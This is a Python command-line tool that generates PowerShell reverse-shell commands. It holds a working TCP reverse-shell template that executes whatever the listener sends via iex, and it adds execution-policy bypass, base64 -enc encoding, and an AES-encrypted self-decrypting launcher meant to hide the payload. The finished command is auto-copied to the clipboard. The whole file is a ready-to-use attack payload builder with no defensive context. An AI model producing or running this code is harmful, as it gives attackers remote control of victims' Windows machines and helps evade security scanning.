#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib
import ipaddress
import secrets
import shutil
import subprocess
import sys
from pathlib import Path
from textwrap import dedent


AES_BLOCK_SIZE = 16
AES_KEY_SIZE = 32
GREEN = "\033[1;92m"
PBKDF2_ITERATIONS = 200_000
RESET = "\033[0m"
SALT_SIZE = 16
CLIPBOARD_TIMEOUT_SECONDS = 5
REVERSE_SHELL_TEMPLATE = dedent(
    """
    $c = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
    $s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};
    while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
        $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
        $sb = (iex $d 2>&1 | Out-String );
        $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
        $s.Write($sb,0,$sb.Length);
        $s.Flush()
    }};
    $c.Close()
    """
).strip()


def create_argument_parser(*args, **kwargs) -> argparse.ArgumentParser:
    try:
        return argparse.ArgumentParser(*args, color=False, **kwargs)
    except TypeError:
        return argparse.ArgumentParser(*args, **kwargs)


def valid_ip(value: str) -> str:
    try:
        ipaddress.ip_address(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"Invalid IP address: {value}") from exc
    return value


def valid_port(value: str) -> int:
    try:
        port = int(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"Port must be an integer: {value}") from exc
    if not (1 <= port <= 65535):
        raise argparse.ArgumentTypeError("Port must be in range 1..65535")
    return port


def build_parser() -> argparse.ArgumentParser:
    parser = create_argument_parser(
        description=(
            "Build a PowerShell reverse-shell command.\n\n"
            "Output modes:\n"
            "  raw      Print a full copy-paste PowerShell command (default).\n"
            "  base64   Use --base64 to print a full command with -enc.\n"
            "  encrypt  Use --encode to AES-256-CBC encrypt the final rendered output "
            "and print a ready launch command.\n"
            "           When possible, the final command is copied to the clipboard."
        ),
        epilog=(
            "Examples:\n"
            "  %(prog)s -i 10.10.10.10 -p 4444\n"
            "  %(prog)s -i 2001:db8::10 -p 8443 --base64\n"
            "  %(prog)s -i 127.0.0.1 -p 9001 --encode\n"
            "  %(prog)s -i 127.0.0.1 -p 9001 --base64 --encode -o payload.txt\n\n"
            "--encode encrypts the exact final output selected by the other flags.\n"
            "When clipboard support is available, the final command is copied automatically."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-i",
        "--ip",
        required=True,
        type=valid_ip,
        help="Listener IP address.",
    )
    parser.add_argument(
        "-p",
        "--port",
        required=True,
        type=valid_port,
        help="Listener TCP port.",
    )
    parser.add_argument(
        "-b64",
        "--base64",
        action="store_true",
        help="Render the final output as a full PowerShell -enc command.",
    )
    parser.add_argument(
        "-enc",
        "--encode",
        action="store_true",
        help="AES-256-CBC encrypt the final rendered output.",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        help="Save the final rendered output to a UTF-8 text file.",
    )
    return parser


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    return build_parser().parse_args(argv)


def build_payload(ip: str, port: int) -> str:
    return REVERSE_SHELL_TEMPLATE.format(ip=ip, port=port)


def normalize_payload(payload: str) -> str:
    return " ".join(line.strip() for line in payload.splitlines() if line.strip())


def render_raw_command(payload: str) -> str:
    return f'powershell -exec bypass -Command "{payload}"'


def encode_powershell(payload: str) -> str:
    return base64.b64encode(payload.encode("utf-16-le")).decode("ascii")


def render_base64_command(payload: str) -> str:
    return f"powershell -exec bypass -enc {encode_powershell(payload)}"


def escape_powershell_single_quoted(value: str) -> str:
    return value.replace("'", "''")


def generate_password() -> str:
    return secrets.token_urlsafe(24)


def generate_salt() -> bytes:
    return secrets.token_bytes(SALT_SIZE)


def derive_key_iv(password: str, salt: bytes) -> tuple[bytes, bytes]:
    key_material = hashlib.pbkdf2_hmac(
        "sha256",
        password.encode("utf-8"),
        salt,
        PBKDF2_ITERATIONS,
        dklen=AES_KEY_SIZE + AES_BLOCK_SIZE,
    )
    return key_material[:AES_KEY_SIZE], key_material[AES_KEY_SIZE:]


def apply_pkcs7_padding(data: bytes, block_size: int = AES_BLOCK_SIZE) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len]) * pad_len


def remove_pkcs7_padding(data: bytes, block_size: int = AES_BLOCK_SIZE) -> bytes:
    if not data:
        raise ValueError("Encrypted payload is empty.")
    pad_len = data[-1]
    if pad_len == 0 or pad_len > block_size:
        raise ValueError("Invalid PKCS#7 padding length.")
    if data[-pad_len:] != bytes([pad_len]) * pad_len:
        raise ValueError("Invalid PKCS#7 padding bytes.")
    return data[:-pad_len]


def load_aes():
    try:
        from Crypto.Cipher import AES
    except ModuleNotFoundError as exc:
        raise RuntimeError(
            "Missing dependency: install 'pycryptodome' to use --encode."
        ) from exc
    return AES


def encrypt_text(plaintext: str, password: str, salt: bytes) -> str:
    aes = load_aes()
    key, iv = derive_key_iv(password, salt)
    cipher = aes.new(key, aes.MODE_CBC, iv=iv)
    padded = apply_pkcs7_padding(plaintext.encode("utf-8"))
    ciphertext = cipher.encrypt(padded)
    return base64.b64encode(ciphertext).decode("ascii")


def build_launcher_payload(password: str, salt: bytes, ciphertext: str) -> str:
    salt_b64 = base64.b64encode(salt).decode("ascii")
    escaped_password = escape_powershell_single_quoted(password)
    escaped_salt = escape_powershell_single_quoted(salt_b64)
    escaped_ciphertext = escape_powershell_single_quoted(ciphertext)
    return (
        f"$password='{escaped_password}';"
        f"$salt=[Convert]::FromBase64String('{escaped_salt}');"
        f"$ciphertext=[Convert]::FromBase64String('{escaped_ciphertext}');"
        f"$kdf=[Security.Cryptography.Rfc2898DeriveBytes]::new($password,$salt,{PBKDF2_ITERATIONS},[Security.Cryptography.HashAlgorithmName]::SHA256);"
        "$key=$kdf.GetBytes(32);"
        "$iv=$kdf.GetBytes(16);"
        "$aes=[Security.Cryptography.Aes]::Create();"
        "$aes.Mode=[Security.Cryptography.CipherMode]::CBC;"
        "$aes.Padding=[Security.Cryptography.PaddingMode]::PKCS7;"
        "$aes.Key=$key;"
        "$aes.IV=$iv;"
        "$decryptor=$aes.CreateDecryptor();"
        "$plain=[Text.Encoding]::UTF8.GetString($decryptor.TransformFinalBlock($ciphertext,0,$ciphertext.Length));"
        "iex $plain"
    )


def render_launcher_command(password: str, salt: bytes, ciphertext: str) -> str:
    return render_base64_command(build_launcher_payload(password, salt, ciphertext))


def ensure_trailing_newline(text: str) -> str:
    return text if text.endswith("\n") else text + "\n"


def format_command_output(command: str) -> str:
    return f"Command: {command}"


def render_output(ip: str, port: int, use_base64: bool, use_encode: bool) -> str:
    payload = normalize_payload(build_payload(ip, port))
    rendered = render_base64_command(payload) if use_base64 else render_raw_command(payload)
    if not use_encode:
        return rendered

    password = generate_password()
    salt = generate_salt()
    ciphertext = encrypt_text(rendered, password, salt)
    return render_launcher_command(password, salt, ciphertext)


def clipboard_commands() -> list[list[str]]:
    return [
        ["pbcopy"],
        ["wl-copy"],
        ["xclip", "-selection", "clipboard"],
        ["xsel", "--clipboard", "--input"],
        ["clip.exe"],
        ["clip"],
        [
            "powershell.exe",
            "-NoProfile",
            "-Command",
            "Set-Clipboard -Value ([Console]::In.ReadToEnd())",
        ],
    ]


def find_first_available_clipboard_command() -> list[str] | None:
    candidates = clipboard_commands()
    if not candidates:
        return None

    with ThreadPoolExecutor(max_workers=len(candidates)) as executor:
        future_to_command = {
            executor.submit(shutil.which, command[0]): command for command in candidates
        }

        for future in as_completed(future_to_command):
            command = future_to_command[future]
            try:
                path = future.result()
            except Exception:
                continue

            if not path:
                continue

            for pending in future_to_command:
                if pending is not future:
                    pending.cancel()
            return command

    return None


def copy_to_clipboard(text: str) -> bool:
    command = find_first_available_clipboard_command()
    if command is None:
        return False

    try:
        completed = subprocess.run(
            command,
            input=text,
            text=True,
            capture_output=True,
            check=False,
            timeout=CLIPBOARD_TIMEOUT_SECONDS,
        )
    except (OSError, subprocess.TimeoutExpired):
        return False

    return completed.returncode == 0


def print_green_status(message: str) -> None:
    print(f"{GREEN}{message}{RESET}", file=sys.stderr, flush=True)


def write_output(output_path: Path, rendered_output: str) -> None:
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(rendered_output, encoding="utf-8")


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)

    try:
        command = render_output(args.ip, args.port, args.base64, args.encode)
        rendered_output = ensure_trailing_newline(
            format_command_output(command)
        )
    except RuntimeError as exc:
        print(f"Error: {exc}", file=sys.stderr)
        return 1

    if args.output is not None:
        try:
            write_output(args.output, rendered_output)
        except OSError as exc:
            print(f"Error writing output file {args.output}: {exc}", file=sys.stderr)
            return 1

    if copy_to_clipboard(command):
        print_green_status("Command copied to clipboard.")
    else:
        print(
            "Warning: clipboard tool not found or copy failed; command printed to stdout.",
            file=sys.stderr,
            flush=True,
        )
    sys.stdout.write(rendered_output)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
